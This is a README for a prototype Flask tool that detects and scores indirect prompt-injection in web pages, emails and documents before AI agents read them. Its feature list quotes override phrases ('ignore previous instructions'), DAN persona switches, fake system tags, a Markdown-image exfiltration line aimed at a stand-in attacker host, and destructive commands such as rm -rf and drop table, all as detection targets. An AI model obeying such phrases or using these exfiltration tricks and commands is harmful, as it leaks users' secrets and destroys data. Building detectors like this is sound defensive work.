# AI Security Shield 🛡️

**AI Security Shield** is a prototype cybersecurity defense layer designed to detect, analyze, explain, and isolate indirect prompt-injection attacks and malicious directives embedded in untrusted external content (webpages, emails, documents, and tool-generated text) before it reaches AI agents.

---

## 🌟 Key Features

1. **Untrusted Content Inspector**: Submit any external text payload or select from pre-loaded benign and malicious test datasets.
2. **Hybrid Pattern & Heuristic Detector Engine**:
   - **System Prompt Overrides**: Detects instructions like "ignore previous instructions", "disregard prior system prompts".
   - **Data Exfiltration Vectors**: Flag requests to print system prompts, reveal secret API keys, or exfiltrate credentials via Markdown image tags (`![img](https://attacker.site/steal?data=...)`).
   - **Hidden Tags & Structural Bypass**: Identifies fake structural XML/HTML system tags (`<system>`, `</system>`).
   - **Jailbreak & Persona Switches**: Detects DAN mode and persona override attempts.
   - **Malicious Commands**: Identifies shell commands or database deletion instructions (`rm -rf`, `drop table`).
3. **Risk Scoring & Classification**:
   - **SAFE (0-24)**: Green indicator, recommended action: `ALLOW`.
   - **SUSPICIOUS (25-59)**: Yellow indicator, recommended action: `ISOLATE / REVIEW`.
   - **MALICIOUS (60-100)**: Red indicator, recommended action: `BLOCK`.
4. **Interactive Threat Inspector**: Highlights flagged lines, pinpoints specific matched text snippets, categorizes attack vectors, and provides plain-language explanations of security risks.
5. **Interactive Security Decisions & Session Audit Log**: Allows security operators to choose `Allow`, `Isolate`, or `Block` with real-time audit log tracking.

---

## 🏗️ Architecture

```text
ai-security-shield/
├── app/
│   ├── __init__.py          # Flask application initialization and API routes
│   ├── detector.py          # SecurityDetector engine (Regex, Heuristics, Scoring)
│   ├── samples.py           # Pre-loaded benign and malicious test datasets
│   ├── static/
│   │   ├── css/style.css    # Modern dark-theme cybersecurity dashboard UI styling
│   │   └── js/main.js       # Dynamic AJAX analysis, snippet inspector, & decision handlers
│   └── templates/
│       └── index.html       # Single-page interactive security dashboard
├── tests/
│   └── test_detector.py     # Unit tests verifying detection rates and API endpoints
├── app.py                   # Local development server entry point
├── PROJECT_SPEC.md          # Full project specification document
├── README.md                # Project documentation
├── requirements.txt         # Python dependencies
└── .gitignore               # Git exclusion rules
```

---

## 🚀 Quick Start Guide

### 1. Prerequisites
- Python 3.9+
- Git

### 2. Installation
Clone the repository and install the dependencies:
```bash
git clone https://github.com/marycarmelniya-ctrl/ai-security-shield.git
cd ai-security-shield
pip install -r requirements.txt
```

### 3. Running Locally
Start the Flask development server:
```bash
python app.py
```
Open your web browser and navigate to:
```text
http://127.0.0.1:5000/
```

---

## 🧪 Running Automated Tests

Run the unit test suite to verify detection accuracy and API endpoints:
```bash
python -m unittest discover -s tests
```

---

## 🔒 Security & Privacy Notice

- **No Secrets Stored**: API keys, credentials, and sensitive tokens are strictly excluded from source code.
- **Prototype Status**: AI Security Shield is a hackathon prototype designed for inspecting external content before LLM execution. It is intended to complement, not replace, production web application firewalls (WAFs) and endpoint security.
